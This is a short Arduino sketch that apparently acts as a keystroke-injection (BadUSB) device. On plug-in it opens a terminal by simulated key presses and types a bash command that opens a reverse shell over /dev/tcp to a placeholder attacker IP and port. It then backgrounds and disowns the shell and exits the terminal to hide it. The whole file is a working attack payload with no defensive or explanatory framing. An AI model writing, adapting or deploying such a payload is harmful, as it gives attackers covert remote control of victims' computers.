#include <Keyboard.h>

void pressKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  delay(3000); 
  pressKey(KEY_LEFT_GUI);

  delay(750); 
  Keyboard.println("terminal");

  delay(1500);
  Keyboard.println("nohup /bin/bash -c \"/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\" >/dev/null 2>&1 &; disown; exit");
}
 

void loop() {
}
